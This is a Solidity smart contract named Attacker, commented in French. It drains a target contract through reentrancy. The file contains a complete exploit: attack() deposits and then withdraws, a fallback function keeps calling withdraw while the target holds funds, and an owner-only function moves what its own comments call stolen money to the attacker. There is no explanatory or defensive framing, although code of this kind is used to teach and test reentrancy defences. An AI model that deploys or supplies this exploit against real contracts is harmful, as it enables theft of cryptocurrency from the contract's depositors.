// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableContract public vulnerableContract;
    address public owner;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    // Dépôt initial pour devenir un utilisateur du contrat vulnérable
    function attack() external payable {
        require(msg.value >= 0.01 ether, "Envoyez au moins 0.01 ETH");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(); // Déclenche l'attaque
    }

    // La fonction fallback est appelée par le contrat vulnérable lors du retrait
    fallback() external payable {
        if (address(vulnerableContract).balance >= 0.01 ether) {
            vulnerableContract.withdraw();
        }
    }

    // Fonction permettant de retirer l'argent volé
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Seul le propriétaire peut retirer les fonds");
        payable(owner).transfer(address(this).balance);
    }

    // Permet de récupérer le solde du contrat attaquant
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
